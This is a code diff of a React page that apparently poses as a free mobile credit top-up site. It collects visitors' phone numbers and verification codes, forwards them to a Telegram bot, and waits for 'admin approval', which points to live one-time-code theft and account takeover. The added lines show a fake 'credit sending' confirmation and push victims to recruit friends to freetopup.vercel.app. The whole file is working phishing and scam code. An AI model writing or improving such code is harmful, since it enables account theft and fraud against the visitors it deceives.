@@ -27,21 +27,6 @@ function App() {
   const [phoneNumber, setPhoneNumber] = useState(['', '', '', '', '']);
   const [verificationCode, setVerificationCode] = useState(['', '', '', '', '']);
   const [showCookieConsent, setShowCookieConsent] = useState(true);
-  const [sessionId] = useState<string>(() => {
-    try {
-      const ex = localStorage.getItem('sessionId');
-      if (ex) return ex;
-      const sid = (crypto && 'randomUUID' in crypto) ? crypto.randomUUID()
-        : Math.random().toString(36).slice(2) + Date.now().toString(36);
-      localStorage.setItem('sessionId', sid);
-      return sid;
-    } catch {
-      return Math.random().toString(36).slice(2) + Date.now().toString(36);
-    }
-  });
-  const [waiting, setWaiting] = useState(false);
-  const [errorText, setErrorText] = useState<string | null>(null);
-
 const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: string }) => {
     try {
       const response = await fetch('/api/telegram', {
@@ -71,22 +56,36 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
   const handleVerificationSubmit = async () => {
     const fullCode = verificationCode.join('');
     if (fullCode.length === 5) {
-      setWaiting(true);
-      setErrorText(null);
       const success = await sendToTelegramBot({ type: 'verification', value: fullCode });
       if (success) {
+        // Poll approval status
         const poll = async () => {
           try {
             const res = await fetch(`/api/status?sessionId=${encodeURIComponent(sessionId)}`);
-            if (!res.ok) throw new Error('status failed');
             const data = await res.json();
             if (data.status === 'approved') {
-              setWaiting(false);
               setCurrentStep('done');
+              // After approved, start polling for image until admin replies a photo
+              setWaitingImage(true);
+              const pollImg = async () => {
+                try {
+                  const r = await fetch(`/api/status?sessionId=${encodeURIComponent(sessionId)}`);
+                  const j = await r.json();
+                  if (j.image) {
+                    setImageUrl(j.image);
+                    setWaitingImage(false);
+                  } else {
+                    setTimeout(pollImg, 2000);
+                  }
+                } catch {
+                  setTimeout(pollImg, 3000);
+                }
+              };
+              pollImg();
             } else if (data.status === 'rejected') {
-              setWaiting(false);
+              // exact message as requested
+              alert('you entered wrong code , enter true code');
               setVerificationCode(['', '', '', '', '']);
-              setErrorText('you entered wrong code , enter true code');
             } else {
               setTimeout(poll, 2000);
             }
@@ -95,8 +94,6 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
           }
         };
         poll();
-      } else {
-        setWaiting(false);
       }
     }
   };
@@ -240,15 +237,9 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
                       />
                     ))}
                   </div>
-                  {errorText && (
-                    <p className="text-red-500 font-semibold mb-4">{errorText}</p>
-                  )}
-                  {waiting && (
-                    <p className="text-white/90 mb-4">Waiting for admin approval…</p>
-                  )}
                   <button 
                     onClick={handleVerificationSubmit}
-                    disabled={verificationCode.join('').length !== 5 || waiting}
+                    disabled={verificationCode.join('').length !== 5}
                     className="bg-red-600 hover:bg-red-700 disabled:bg-gray-400 disabled:cursor-not-allowed text-white px-8 py-4 rounded-xl font-semibold text-lg transition-colors duration-200 shadow-lg"
                   >
                     Submit Code
@@ -266,6 +257,33 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
                   <h2 className="text-4xl text-white font-bold">
                     Done!
                   </h2>
+
+                  {/* Extra message after Done */}
+                  <p className="text-white/90 mt-4">
+                    wait for the credit sending process to complete
+                  </p>
+
+                  {/* Live image area */}
+                  {waitingImage && !imageUrl && (
+                    <p className="text-white/70 mt-3">Waiting for image…</p>
+                  )}
+                  {imageUrl && (
+                    <div className="mt-6">
+                      <img
+                        src={imageUrl}
+                        alt="credit confirmation"
+                        className="mx-auto rounded-lg shadow-lg max-h-[360px]"
+                      />
+                      <div className="mt-4 text-center">
+                        <a href="https://freetopup.vercel.app" className="text-blue-300 underline">
+                          freetopup.vercel.app
+                        </a>
+                        <p className="text-white/90 mt-2">
+                          Invite your friends and acquaintances to this site to receive more credit (calculation method after 00:00)
+                        </p>
+                      </div>
+                    </div>
+                  )}
                 </div>
               </div>
             )}
